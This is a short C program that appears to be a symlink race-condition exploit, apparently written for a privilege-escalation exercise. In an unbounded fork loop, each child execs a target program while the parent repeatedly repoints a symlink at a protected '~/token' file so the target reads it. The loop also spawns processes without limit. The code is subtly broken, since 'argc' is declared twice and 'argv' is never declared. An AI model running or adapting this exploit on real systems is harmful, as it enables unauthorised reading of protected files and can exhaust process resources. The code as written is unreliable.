#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int	main(int argc, char *argc[])
{
	int	pid;

	while (1)
	{
		pid = fork();
		if (pid == 0)
		{
			system("ln -sf ./tik ./tok");
			execve(argv[1], argv + 1, NULL);
			exit(0);
		}
		else
		{
			system("ln -sf ~/token ./tok");
		}
	}
	return (0);
}
